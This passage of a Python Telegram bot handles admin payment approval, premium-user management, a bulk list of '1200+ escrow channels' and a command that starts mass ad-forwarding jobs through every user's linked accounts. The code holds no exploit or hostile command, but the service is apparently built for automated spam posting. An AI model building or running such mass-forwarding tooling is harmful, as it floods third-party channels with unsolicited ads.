                await ctx.bot.send_message(
                    chat_id=target_uid,
                    text=(
                        f"{e('deco_fly_l')} {e('crown')} <b>PAYMENT APPROVED!</b> {e('fire')}{e('deco_fly_r')}\n\n"
                        f"🎉 <b>Congratulations! Your Premium Membership is now UNLOCKED!</b>\n\n"
                        f"⚡ You now have full access to <b>⚡ Auto Join Engine</b> and <b>📢 1200+ Escrow Channels List</b>.\n\n"
                        f"<i>Tap below to open your Premium Dashboard:</i>"
                    ),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Open Premium Menu", callback_data="btn_premium", icon_custom_emoji_id=_E["crown"], style="success")]]),
                    parse_mode="HTML"
                )
            except Exception as notify_err:
                print(f"[Notify User Error] {notify_err}")

        # ── Admin: Reject Payment Screenshot ──────────────────────────
        elif data.startswith("adm_pay_reject_"):
            parts = data.replace("adm_pay_reject_", "").split("_")
            pay_id = int(parts[0])
            target_uid = int(parts[1])

            db.update_payment_status(pay_id, "rejected")

            header = f"{e('deco_fly_l')} ❌ <b>PAYMENT REJECTED</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            await safe_edit_text_or_caption(
                query,
                text=f"{header}\n{divider}\n\n❌ <b>Payment #{pay_id} Rejected.</b>\nUser <code>{target_uid}</code> notification sent.",
                reply_markup=None,
                parse_mode="HTML"
            )

            try:
                await ctx.bot.send_message(
                    chat_id=target_uid,
                    text=f"❌ <b>Payment Verification Failed/Rejected.</b> Please contact Admin if you believe this is an error.",
                    parse_mode="HTML"
                )
            except Exception:
                pass

        # ── Admin: Premium Users Management ───────────────────────────
        elif data == "adm_prem_users":
            prem_users = db.get_all_premium_users()
            header = f"{e('deco_fly_l')} ⭐ <b>PREMIUM USERS LIST</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if not prem_users:
                list_text = f"{header}\n{divider}\n\n<i>No Premium users registered yet.</i>"
            else:
                user_lines = []
                for idx, u in enumerate(prem_users, 1):
                    user_lines.append(f"👑 <code>{idx}.</code> ID: <code>{u['user_id']}</code> (@{u['username'] or 'no_username'})")
                list_text = f"{header}\n{divider}\n\n⭐ <b>Active Premium Users ({len(prem_users)}):</b>\n\n" + "\n".join(user_lines)

            await safe_edit_text_or_caption(
                query,
                text=list_text,
                reply_markup=InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("Grant Premium to User ID", callback_data="adm_add_prem_uid", icon_custom_emoji_id=_E["plus"], style="success"),
                        InlineKeyboardButton("Revoke Premium", callback_data="adm_rem_prem_uid", icon_custom_emoji_id=_E["cross"], style="danger"),
                    ],
                    [InlineKeyboardButton("Back to Admin Dashboard", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary")]
                ]),
                parse_mode="HTML"
            )

        elif data == "adm_add_prem_uid":
            ctx.user_data["state"] = ADMIN_WAITING_PREMIUM_UID
            ctx.user_data["prem_action"] = "add"
            await query.message.reply_text("⭐ <b>[Admin] Send Telegram User ID to Grant Premium Access:</b>\n\n<i>Type /cancel to abort.</i>", parse_mode="HTML")

        elif data == "adm_rem_prem_uid":
            ctx.user_data["state"] = ADMIN_WAITING_PREMIUM_UID
            ctx.user_data["prem_action"] = "remove"
            await query.message.reply_text("➖ <b>[Admin] Send Telegram User ID to Revoke Premium Access:</b>\n\n<i>Type /cancel to abort.</i>", parse_mode="HTML")

        # ── Admin: Escrow Channels Management ─────────────────────────
        elif data == "adm_manage_escrow":
            escrow_links = db.get_escrow_channels()
            header = f"{e('deco_fly_l')} 📢 <b>1200+ ESCROW CHANNELS LIST MANAGER</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            cnt = len(escrow_links)
            msg_text = (
                f"{header}\n{divider}\n\n"
                f"📢 <b>Total Active Escrow Channels in DB:</b> <code>{cnt}</code>\n\n"
                f"<i>You can add channel links in bulk (paste list) or clear existing links list.</i>"
            )
            await safe_edit_text_or_caption(
                query,
                text=msg_text,
                reply_markup=InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("Add Channel Links (Bulk)", callback_data="adm_add_escrow", icon_custom_emoji_id=_E["plus"], style="success"),
                        InlineKeyboardButton("Clear ALL Channels", callback_data="adm_clear_escrow", icon_custom_emoji_id=_E["trash"], style="danger"),
                    ],
                    [InlineKeyboardButton("Back to Admin Dashboard", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary")]
                ]),
                parse_mode="HTML"
            )

        elif data == "adm_add_escrow":
            ctx.user_data["state"] = ADMIN_WAITING_ESCROW_LINKS
            await query.message.reply_text("📢 <b>[Admin] Paste all Channel / Group links below (one per line or separated by space):</b>\n\n<i>Type /cancel to abort.</i>", parse_mode="HTML")

        elif data == "adm_clear_escrow":
            db.clear_escrow_channels()
            await query.message.reply_text("🗑️ <b>[Admin] All 1200+ Escrow Channels list cleared!</b>", parse_mode="HTML")

        # ── Admin: Change Payment QR Photo ────────────────────────────
        elif data == "adm_change_qr":
            ctx.user_data["state"] = ADMIN_WAITING_QR_PHOTO
            await query.message.reply_text("📸 <b>[Admin] Send the NEW Payment QR Code PHOTO in this chat:</b>\n\n<i>Type /cancel to abort.</i>", parse_mode="HTML")

        # ── Admin: Broadcast All ───────────────────────────────────
        elif data == "adm_all_str":
            users = db.get_all_users()
            started = 0
            skipped = 0
            for u in users:
                uid_u    = u["user_id"]
                accounts = db.get_accounts(uid_u)
                ad       = db.get_ad(uid_u)
                settings = db.get_settings(uid_u)
                if not accounts or not ad or sched.is_user_running(uid_u):
                    skipped += 1
                    continue
                interval = settings["interval"]
                cycles   = settings["cycles"]
                sched.start_user_job(
                    owner_id=uid_u, interval_key=interval,
                    max_cycles=cycles, bot=ctx.bot,
                    chat_id=query.message.chat_id
                )
                asyncio.create_task(broadcaster.broadcast_once(uid_u))
                started += 1

            header = f"{e('deco_fly_l')} <b>MASS AD-FORWARDING STARTED</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            await query.message.reply_text(
                f"{header}\n{divider}\n\n"
                f"📢 <b>[Admin] All Users' Ad-Forwarding Jobs Started!</b>\n\n"
                f"{e('check')} <b>Started Users:</b> <code>{started}</code>\n"
                f"⏭ <b>Skipped Users:</b> <code>{skipped}</code> <i>(no account/ad or running)</i>\n{divider}",
                parse_mode="HTML"
            )

        # ── Admin: Stop All Broadcasts ─────────────────────────────
        elif data == "adm_all_stp":
            users   = db.get_all_users()
            stopped = 0
            for u in users:
                uid_u = u["user_id"]
                if sched.is_user_running(uid_u):
                    sched.stop_user_job(uid_u)
                    stopped += 1

            header = f"{e('deco_fly_l')} <b>MASS BROADCAST STOPPED</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            await query.message.reply_text(
                f"{header}\n{divider}\n\n"
                f"{e('cross')} <b>[Admin] All Broadcasts Stopped!</b>\n\n"
                f"⏹ <b>Stopped Active Jobs:</b> <code>{stopped}</code>\n{divider}",
                parse_mode="HTML"
            )

    except Exception as err:
        logger.error(f"[Admin Callback Error] {err}", exc_info=True)
        await query.message.reply_text(f"❌ Error: `{escape_md(str(err))}`", parse_mode="Markdown")


async def handle_chat_member_update(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    result = update.chat_member
    if not result:
        return
    user_id = result.from_user.id
    old_status = result.old_chat_member.status
    new_status = result.new_chat_member.status
    chat_id = str(result.chat.id)

    if old_status in ("creator", "administrator", "member", "restricted") and new_status in ("left", "kicked"):
        logger.info(f"[User Left Channel] User {user_id} left chat {chat_id}")
        db.remove_join_request(user_id, chat_id)
        db.remove_join_request(user_id)


# ═══════════════════════════════════════════════════════════
#   MAIN
# ═══════════════════════════════════════════════════════════

async def post_init_callback(application):
    asyncio.create_task(broadcaster.init_all_auto_reply_listeners())
    asyncio.create_task(fampay_engine.fampay_auto_syncer_loop())
    asyncio.create_task(gmail_payment_engine.gmail_auto_syncer_loop())


def main():
    db.init_db()
    sched.start_scheduler()
    request = HTTPXRequest(
        connection_pool_size=500,
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(request)
        .concurrent_updates(256)
        .post_init(post_init_callback)
        .build()
    )

    app.add_handler(CommandHandler("start",  start_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CommandHandler(["admin", "chinu", "panel"], admin_cmd))
    app.add_handler(CommandHandler(["exportdb", "db", "getdb"], export_db_cmd))


    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^(admin_|adm_)"))
    app.add_handler(CallbackQueryHandler(main_callback))
    app.add_handler(ChatJoinRequestHandler(handle_chat_join_request))
    app.add_handler(ChatMemberHandler(handle_chat_member_update, ChatMemberHandler.CHAT_MEMBER))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.VIDEO | filters.ANIMATION | filters.PHOTO | filters.VIDEO_NOTE | filters.Document.VIDEO, handle_media))

    logger.info("🤖 AdBot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
